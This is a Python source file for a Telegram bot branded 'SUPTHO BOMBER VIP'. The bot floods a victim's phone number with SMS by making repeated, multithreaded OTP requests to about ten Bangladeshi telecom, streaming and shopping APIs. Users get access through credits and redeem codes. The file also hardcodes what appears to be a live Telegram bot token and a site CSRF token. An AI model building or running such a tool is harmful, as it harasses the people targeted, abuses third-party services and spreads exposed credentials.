import telebot
import requests
import threading
import time
import os
import json
import random
import string
from concurrent.futures import ThreadPoolExecutor
from flask import Flask
from telebot import types

# ==========================================
# 🌐 WEB SERVER (For Render)
# ==========================================
app = Flask('')
@app.route('/')
def home(): return "Turbo Bot is Running!"

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = threading.Thread(target=run_web_server, daemon=True)
    t.start()

# ==========================================
# 🔧 CONFIGURATION (সঠিক তথ্য দিন)
# ==========================================
API_TOKEN = '8577991344:AAFyp9TUo-BrzgUpO1ZRoy6fjnc41hBG4GM'  # <--- Bot Token দিন
OWNER_ID = 6941003064              # <--- আপনার Numeric ID দিন (UserInfoBot থেকে নিন)
OWNER_NAME = "Suptho Hpd"
CHANNEL_ID = "@SH_tricks"         
DATA_FILE = 'bot_db.json'

bot = telebot.TeleBot(API_TOKEN)

# ==========================================
# 💾 DATABASE MANAGER
# ==========================================
def load_data():
    if not os.path.exists(DATA_FILE):
        return {"users": {}, "codes": [], "whitelist": [], "banned": []}
    try:
        with open(DATA_FILE, 'r') as f: return json.load(f)
    except: return {"users": {}, "codes": [], "whitelist": [], "banned": []}

def save_data(data):
    with open(DATA_FILE, 'w') as f: json.dump(data, f, indent=4)

db = load_data()

# ==========================================
# 🚀 ULTRA FAST API ENGINE
# ==========================================
def api_hit(url, method, data=None, json_data=None):
    try:
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        if method == "POST": requests.post(url, data=data, json=json_data, headers=headers, timeout=2)
        else: requests.get(url, headers=headers, timeout=2)
    except: pass

def get_all_apis(target):
    return [
        ("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", "POST", None, {"number": "+88"+target}),
        (f"https://www.bioscopelive.com/en/login/send-otp?phone=88{target}", "GET", None, None),
        (f"https://api.hoichoi.tv/users/otp?phone={target}&country_code=880", "GET", None, None),
        ("https://api.apex4u.com/api/auth/login", "POST", None, {"phoneNumber": target}),
        ("https://shopbasebd.com/store/registration/sendOTP", "POST", {"number": target, "_token": "ktrqcmKSAn8cP3vZvw3xkbav2ww65eRvaikWKDFo"}, None),
        ("https://web-api.banglalink.net/api/v1/user/otp-login/request", "POST", None, {"mobile": target}),
        ("https://webloginda.grameenphone.com/backend/api/v1/otp", "POST", {"msisdn": target}, None),
        ("https://api.shikho.com/auth/v2/send/sms", "POST", None, {"phone": "88"+target, "type": "student"}),
        ("https://api.swap.com.bd/api/v1/send-otp", "POST", None, {"phone": target}),
        (f"https://api.shadhinmusic.com/api/v1/auth/otp?phone={target}", "GET", None, None)
    ]

def attack_executor(target, amount):
    apis = get_all_apis(target)
    with ThreadPoolExecutor(max_workers=30) as executor:
        count = 0
        while count < amount:
            for url, method, data, json_data in apis:
                if count >= amount: break
                executor.submit(api_hit, url, method, data, json_data)
                count += 1

# ==========================================
# 🤖 COMMANDS & UI
# ==========================================
def is_user_joined(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except: return False

@bot.message_handler(commands=['start'])
def welcome(message):
    uid = str(message.from_user.id)
    if uid not in db['users']:
        db['users'][uid] = {"credits": 5}
        save_data(db)
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🚀 Start Bomb", "💳 My Balance", "👥 Refer & Earn", "💰 Redeem Credit")
    bot.send_message(message.chat.id, f"🔥 **SUPTHO BOMBER VIP** 🔥\nWelcome {message.from_user.first_name}!", reply_markup=markup, parse_mode='Markdown')

# --- ফিক্সড অ্যাডমিন কমান্ডসমূহ ---
@bot.message_handler(commands=['admin', 'gencodes', 'stats'])
def admin_commands(message):
    if message.from_user.id != OWNER_ID:
        return bot.reply_to(message, "❌ আপনি অ্যাডমিন নন।")
    
    cmd = message.text.split()
    if cmd[0] == '/admin':
        text = "👑 **Admin Panel**\n\n`/gencodes 5` - ৫টি কোড বানান\n`/stats` - বটের তথ্য\n`/addcredit ID Amount` - ক্রেডিট দিন"
        bot.send_message(message.chat.id, text, parse_mode='Markdown')
    
    elif cmd[0] == '/stats':
        users_count = len(db['users'])
        codes_count = len(db['codes'])
        bot.reply_to(message, f"📊 **Bot Stats**\nTotal Users: {users_count}\nActive Codes: {codes_count}", parse_mode='Markdown')
        
    elif cmd[0] == '/gencodes':
        try:
            num = int(cmd[1])
            new_codes = ["SUP-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6)) for _ in range(num)]
            db['codes'].extend(new_codes)
            save_data(db)
            bot.reply_to(message, f"✅ **{num} Codes Generated:**\n`{', '.join(new_codes)}`", parse_mode='Markdown')
        except: bot.reply_to(message, "❌ সঠিক ফরম্যাট: `/gencodes 5`")

# --- বাটন হ্যান্ডলার ---
@bot.message_handler(func=lambda m: True)
def handle_all(message):
    uid = str(message.from_user.id)
    if not is_user_joined(message.from_user.id):
        return bot.reply_to(message, f"❌ Join {CHANNEL_ID} first!")

    if message.text == "🚀 Start Bomb":
        msg = bot.reply_to(message, "💣 ১১ ডিজিটের নাম্বার দিন:")
        bot.register_next_step_handler(msg, ask_amount)
    elif message.text == "💳 My Balance":
        cred = "Unlimited" if int(uid) == OWNER_ID else db['users'].get(uid, {}).get('credits', 0)
        bot.reply_to(message, f"💰 Balance: {cred} Credits")
    elif message.text == "💰 Redeem Credit":
        msg = bot.reply_to(message, "🎁 Redeem Code দিন:")
        bot.register_next_step_handler(msg, use_redeem)

def ask_amount(message):
    target = message.text.strip()
    if len(target) != 11: return bot.reply_to(message, "⚠️ Incorrect number.")
    msg = bot.reply_to(message, f"🎯 Target: {target}\n🔢 Amount (Max 100):")
    bot.register_next_step_handler(msg, process_bomb, target)

def process_bomb(message, target):
    uid = str(message.from_user.id)
    try:
        amount = int(message.text)
        if int(uid) != OWNER_ID:
            if db['users'][uid]['credits'] < 1: return bot.reply_to(message, "⚠️ No Credits!")
            db['users'][uid]['credits'] -= 1
            save_data(db)
        
        bot.send_message(message.chat.id, f"🚀 **Attack Started!**\nTarget: {target}")
        attack_executor(target, amount)
        bot.send_message(message.chat.id, f"✅ **Finished!** Sent: {amount}")
    except: bot.reply_to(message, "❌ Error.")

def use_redeem(message):
    code = message.text.strip()
    if code in db['codes']:
        db['codes'].remove(code)
        db['users'][str(message.from_user.id)]['credits'] += 5
        save_data(db); bot.reply_to(message, "✅ +5 Credits Added!")
    else: bot.reply_to(message, "❌ Invalid.")

if __name__ == "__main__":
    try: bot.remove_webhook()
    except: pass
    keep_alive()
    bot.polling(non_stop=True)
